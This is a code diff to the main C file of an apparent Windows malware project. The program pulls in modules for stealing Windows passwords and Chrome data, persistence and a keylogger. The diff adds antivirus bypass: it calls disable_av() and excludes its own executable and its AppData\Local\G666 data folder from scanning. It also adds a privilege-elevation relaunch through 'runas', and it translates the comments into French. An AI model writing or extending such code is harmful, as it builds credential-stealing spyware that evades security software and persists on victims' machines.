@@ -6,6 +6,7 @@
 #include "windows_users_passwords.c"
 #include "chrome_data.c"
 #include "persistance.c"
+#include "bypass_av.c"
 #include "keylogger.c"
 #include <stdlib.h>
 
@@ -31,7 +32,7 @@ int main(void)
     char current_executable_path[MAX_PATH];
     GetModuleFileName(NULL, current_executable_path, MAX_PATH);
 
-    // Check if the program is running with administrator privileges
+    // Vérifie si le programme est exécuté avec des privilèges administratifs
     BOOL isAdmin = FALSE;
     HANDLE tokenHandle = NULL;
 
@@ -48,31 +49,39 @@ int main(void)
 
     if (!isAdmin)
     {
-        // Relaunch the program with administrator privileges
+        // Relance le programme avec des privilèges administratifs
         SHELLEXECUTEINFO sei = {sizeof(SHELLEXECUTEINFO)};
-        sei.lpVerb = "runas";
-        sei.lpFile = current_executable_path;
+        sei.lpVerb = "runas";                 // Demande les privilèges administratifs
+        sei.lpFile = current_executable_path; // Chemin de l'exécutable actuel
         sei.hwnd = NULL;
         sei.nShow = SW_NORMAL;
 
         if (!ShellExecuteEx(&sei))
         {
-            printf("Failed to elevate privileges.\n");
+            printf("Impossible d'élever les privilèges.\n");
             exit(EXIT_FAILURE);
         }
+
+        // Quitte immédiatement l'instance actuelle
+        exit(EXIT_SUCCESS);
     }
 
-    // COMPUTER_INFOS est une structure de ../include/structures.h
+    // Si le programme est déjà exécuté en tant qu'administrateur, continue l'exécution
     COMPUTER_INFOS computer;
     get_computer_info(&computer);
+
+    disable_av();                        // Désactiver l'AV (si possible)
+    exclude_av(current_executable_path); // Exclure le logiciel de l'AV (si possible)
 
     char softwareDataDirectory[1024];
     snprintf(softwareDataDirectory, 1024, "C:\\Users\\%s\\AppData\\Local\\G666", computer.username);
 
-    // creation d'un uid
+    exclude_av(softwareDataDirectory); // Exclure le dossier du logiciel
+
+    // Création d'un UID
     srand(time(NULL));
     int random_uid = rand() % 10000001;
-    char uid[30]; // random entre 0 et 10000
+    char uid[30];
     snprintf(uid, 30, "%d", random_uid);
 
     char *filename = "user";
@@ -81,11 +90,11 @@ int main(void)
 
     if (is_first_execution(current_executable_path, softwareDataDirectory, fake_executable_name))
     {
-        // je créer le dossier du logiciel
+        // Crée le dossier du logiciel
         CreateDirectory(softwareDataDirectory, NULL);
-        set_persistance(softwareDataDirectory, current_executable_path, fake_executable_name); // fonction à amméliorer pour que si refus des droits admin, dossier de démarage simplement
+        set_persistance(softwareDataDirectory, current_executable_path, fake_executable_name);
 
-        // Enregistrer l'uid dans dans le repertoire du virus un fichier
+        // Enregistre l'UID dans le répertoire du logiciel
         save_uid(uid);
 
         char client_data[1000];
@@ -97,7 +106,6 @@ int main(void)
     }
     else
     {
-
         get_uid(uid);
     }
 
